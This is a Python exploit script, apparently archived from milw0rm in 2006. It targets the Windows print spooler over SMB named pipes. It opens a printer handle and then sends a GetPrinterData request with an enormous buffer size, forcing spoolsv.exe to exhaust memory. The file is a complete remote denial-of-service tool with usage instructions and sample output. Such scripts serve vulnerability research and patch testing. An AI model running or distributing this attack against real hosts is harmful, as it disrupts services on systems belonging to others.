#!/usr/bin/python
# MS Windows spoolss GetPrinterData() 0day Memory Allocation Remote DoS Exploit
# Bug discovered by h07 <h07@interia.pl>
# Tested on Windows 2000 SP4 Polish + All Microsoft Security Bulletins
# Example:
#
# C:\>python spoolss_dos.py 192.168.0.2 512
#
# [*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit
# [*] Coded by h07 <h07@interia.pl>
# [*] Connecting to 192.168.0.2:445
# [+] Connected
# [+] The NETBIOS connection with the remote host timed out.
# [+] 192.168.0.2: Out of memory
# [+] Done
#
# Exploit --> GetPrinterData(handle, value, 1024 * 1024 * 512) --> MS_Windows
# Spooler service(spoolsv.exe) memory usage: 512 MB
##

from impacket.structure import Structure
from impacket.nmb import NetBIOSTimeout
from impacket.dcerpc import transport
from impacket import uuid
from struct import pack
from string import atoi
from sys import argv
from sys import exit

print "\n[*] MS Windows GetPrinterData() 0day Memory Allocation Remote DoS Exploit"
print "[*] Coded by h07 <h07@interia.pl>"

if(len(argv) < 3):
   print "[*] Usage: %s <host> <memory_size(MB)>" % (argv[0])
   print "[*] Sample: %s 192.168.0.1 512" % (argv[0])
   exit()

MB = 1024 * 1024
host = argv[1]
memory_size = MB * atoi(argv[2])
interface = ('spoolss', '12345678-1234-abcd-ef00-0123456789ab', '1.0')

stringbinding = "ncacn_np:%(host)s[\\pipe\\%(pipe)s]"
stringbinding %= {
'host': host,
'pipe': interface[0],
}

class B1(Structure):
   alignment = 4
   structure = (
       ('id', '<L'),
       ('max', '<L'),
       ('offset', '<L=0'),
       ('actual', '<L'),
       ('str', '%s'),
   )

class B2(Structure):
   alignment = 4
   structure = (
       ('max', '<L'),
       ('offset', '<L=0'),
       ('actual', '<L'),
       ('str', '%s'),
   )

class OpenPrinterEx(Structure):
   alignment = 4
   opnum = 69
   structure = (
       ('printer', ':', B1),
       ('null', '<L=0'),
       ('str', '<L=0'),
       ('null2', '<L=0'),
       ('access', '<L=0'),
       ('level', '<L=1'),
       ('id1', '<L=1'),
       ('level2', '<L=10941724'),
       ('size', '<L=28'),
       ('id2', '<L=0x42424242'),
       ('id3', '<L=0x43434343'),
       ('build', '<L=2600'),
       ('major', '<L=3'),
       ('minor', '<L=0'),
       ('processor', '<L=0xFFFFFFFF'),
       ('client', ':', B2),
       ('user', ':', B2),
   )

class GetPrinterData(Structure):
   alignment = 4
   opnum = 26
   structure = (
       ('handle', '%s'),
       ('value', ':', B2),
       ('offered', '<L'),
   )

trans = transport.DCERPCTransportFactory(stringbinding)

print "[*] Connecting to %s:445" % (host)
try:
   trans.connect()
except:
   print "[-] Connect failed"
   exit()

print "[+] Connected"

dce = trans.DCERPC_class(trans)
dce.bind(uuid.uuidtup_to_bin((interface[1], interface[2])))

query = OpenPrinterEx()
printer = "\\\\%s\x00" % (host)
query['printer'] = B1()
query['printer']['id'] = 0x41414141
query['printer']['max'] = len(printer)
query['printer']['actual'] = len(printer)
query['printer']['str'] = printer.encode('utf_16_le')

client = "\\\\h07\x00"
query['client'] = B2()
query['client']['max'] = len(client)
query['client']['actual'] = len(client)
query['client']['str'] = client.encode('utf_16_le')

user = "h07\x00"
query['user'] = B2()
query['user']['max'] = len(user)
query['user']['actual'] = len(user)
query['user']['str'] = user.encode('utf_16_le')

dce.call(query.opnum, query)
raw = dce.recv()
handle = raw[:20]

if(handle == ("\x00" * 20)):
   print "[-] ERR: OpenPrinterEx()"
   if(raw[20:] == "\x09\x07\x00\x00"):
       print "[-] Return code: Invalid printer name (0x00000709)"
   if(raw[20:] == "\x05\x00\x00\x00"):
       print "[-] Return code: Access denied (0x00000005)"
   exit()

query = GetPrinterData()
value = "blah_blah\x00"
query['handle'] = handle
query['value'] = B2()
query['value']['max'] = len(value)
query['value']['actual'] = len(value)
query['value']['str'] = value.encode('utf_16_le')
query['offered'] = memory_size

dce.call(query.opnum, query)

try:
   raw = dce.recv()
   status = raw[:4]
   r_size = raw[4:8]

   if(status == "\x1b\x00\x00\x1c"):
       print "[-] Memory allocation error, out of memory"
       exit()
   if(r_size == pack("<L", memory_size)):
       print "[+] Memory allocated"

except NetBIOSTimeout, err:
   print "[+] %s" % (err)
   print "[+] %s: Out of memory" % (host)

print "[+] Done"

# EoF

# milw0rm.com [2006-12-01]
